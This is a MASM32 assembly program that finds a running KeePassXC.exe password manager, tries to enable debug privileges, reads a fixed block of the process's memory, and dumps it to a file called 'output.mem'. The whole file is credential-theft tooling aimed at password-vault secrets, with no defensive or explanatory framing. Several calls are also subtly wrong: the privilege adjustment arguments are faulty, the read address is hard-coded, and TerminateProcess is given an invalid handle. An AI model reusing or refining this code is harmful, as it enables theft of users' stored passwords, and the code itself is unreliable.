include C:\masm32\include\masm32rt.inc    
	
.data
	kpxc db "KeePassXC.exe", 0
    outputfile db "output.mem", 0
    savebuffer db 0b00h DUP(0)
    savebufferlen dd 0b00h
    lasterr db 9 DUP(0)
    
    ;error messagess
    
    toolhelpsnap db "no toolhelpsnap", 0dh, 0ah, 0
    firstproc db "no first process", 0dh, 0ah, 0
    processfound db "no processfound", 0dh, 0ah, 0
    cantopenproc db "cant open process",0dh, 0ah, 0
    cantreadmem db "can't read mem", 0dh, 0ah, 0
    cantopenthread db "Can't retrieve own token", 0dh, 0ah, 0
    cantadjusttokenprivilege db "can't adjust token privilege", 0dh, 0ah, 0
    errorcode db "Error code: ", 0
    
.data?
	Procie PROCESSENTRY32<>
	snapHandle dd ?
	procHandle dd ?
    fileHandle dd ?
    myThreadHandle dd ?
    
.code
main:


;Giving self SeDebugPrivilege
    push offset myThreadHandle
    push TRUE
    push TOKEN_ADJUST_PRIVILEGES
    call GetCurrentThread
    push eax
    call OpenThreadToken

    cmp eax, 0
    je die_cantopenthread

    push 0
    push 0
    push 0
    push SE_PRIVILEGE_ENABLED
    push FALSE
    push myThreadHandle
    call AdjustTokenPrivileges
    
    cmp eax, 0
    je die_cantadjusttokenprivilege

; Process scanning
	push 0
    push TH32CS_SNAPALL
    call CreateToolhelp32Snapshot
    cmp eax, INVALID_HANDLE_VALUE
    je die_no_toolhelpsnap
    
	mov snapHandle, eax
	mov edx, sizeof Procie ;need to set size
    mov Procie.dwSize, edx
    push offset Procie
    push [snapHandle]
    call Process32First
    
    cmp eax, 0
    je die_no_firstproc
    
	mainloop:
	push offset Procie
	push [snapHandle]
	call Process32Next
    cmp eax, 0
    je die_no_processfound
    
	push offset Procie.szExeFile
	push offset kpxc
	call lstrcmpA
    
	cmp eax, 0
	jne mainloop
; KeePassXC.exe found!

	push Procie.th32ProcessID
	push FALSE
	push PROCESS_VM_READ OR PROCESS_QUERY_INFORMATION
	call OpenProcess
    
    mov procHandle, eax
    cmp eax, 0
    je die_cantopenproc
; KeePassXC.exe opened
    
    
    
   
    
    
    push 0
    push savebufferlen
    push offset savebuffer
    push 06000000h
    push procHandle
    call ReadProcessMemory
    
    cmp eax, 0
    je die_cantreadmem
; memory read

    push 0
    push FILE_ATTRIBUTE_NORMAL
    push CREATE_ALWAYS
    push 0
    push 0
    push GENERIC_WRITE
    push offset outputfile
    call CreateFile
    mov fileHandle, eax
    
    push 0
    push 0
    push savebufferlen
    push offset savebuffer
    push fileHandle
    call WriteFile
    
    push fileHandle
    call CloseHandle
    
	mov procHandle, eax
    push 0
    push procHandle
    call TerminateProcess

    jmp safeend
;error messagess

    
    die_cantopenthread:
    push offset cantopenthread
    call StdOut
    jmp die

    die_cantadjusttokenprivilege:
    push offset cantadjusttokenprivilege
    call StdOut
    jmp die

    die_no_toolhelpsnap:
    push offset toolhelpsnap
    call StdOut
    jmp die
    
    die_no_firstproc:
    push offset firstproc
    call StdOut
    jmp die
    
    die_no_processfound:
    push offset processfound
    call StdOut
    jmp die
    
    die_cantopenproc:
    push offset cantopenproc
    call StdOut
    jmp die
    
    die_cantreadmem:
    push offset cantreadmem
    call StdOut
    jmp die
    
    
    die:
    call GetLastError
    
    push offset lasterr
    push eax
    call dwtoa
    
    push offset errorcode
    call StdOut
    
    push offset lasterr
    call StdOut
    
    safeend:
    inkey
    push 0
	call ExitProcess
end main
